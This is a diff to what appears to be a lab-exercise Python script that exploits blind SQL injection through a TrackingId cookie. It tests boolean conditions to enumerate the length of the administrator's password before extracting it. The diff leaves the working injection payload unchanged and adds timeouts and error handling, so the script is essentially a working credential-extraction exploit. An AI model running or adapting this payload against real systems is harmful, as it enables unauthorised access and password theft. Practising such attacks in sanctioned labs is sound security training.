@@ -11,13 +11,30 @@ def search_text(response):
 
 
 def enumerate_password_length(url, session):
-    for i in range(1, 50):
-        payload = f"ABC' OR (select username from users where username='administrator' AND LENGTH(password)={i})='administrator"
-        response = session.get(url, cookies={"TrackingId": payload})
-        if search_text(response):
-            password_length = i
-            break
-    return password_length
+    try:
+        password_length = 0
+        for i in range(1, 50):
+            payload = f"ABC' OR (select username from users where username='administrator' AND LENGTH(password)={i})='administrator"
+            response = session.get(url, cookies={"TrackingId": payload}, timeout=10)
+            if search_text(response):
+                password_length = i
+                break
+        if password_length > 1:
+            return password_length
+        else:
+            return None
+
+    except requests.exceptions.MissingSchema:
+        print("(-) Please enter a valid URL.")
+        sys.exit(1)
+
+    except requests.exceptions.Timeout:
+        print("(-) Request timed out.")
+        sys.exit(1)
+
+    except requests.exceptions.RequestException as e:
+        print("(-) An error has occurred: {e}")
+        sys.exit(1)
 
 
 def enumerate_password(url, session, password_length):
@@ -49,7 +66,11 @@ def main():
 
     print("(+) Enumerating Password Length...")
     password_length = enumerate_password_length(url, session)
-    print(f"(+) Password Length: {password_length} characters ")
+    if password_length:
+        print(f"(+) Password Length: {password_length} characters ")
+    else:
+        print("(-) Something went wrong. Please check your URL and try again.")
+        sys.exit(1)
     enumerate_password(url, session, password_length)
     print()
 
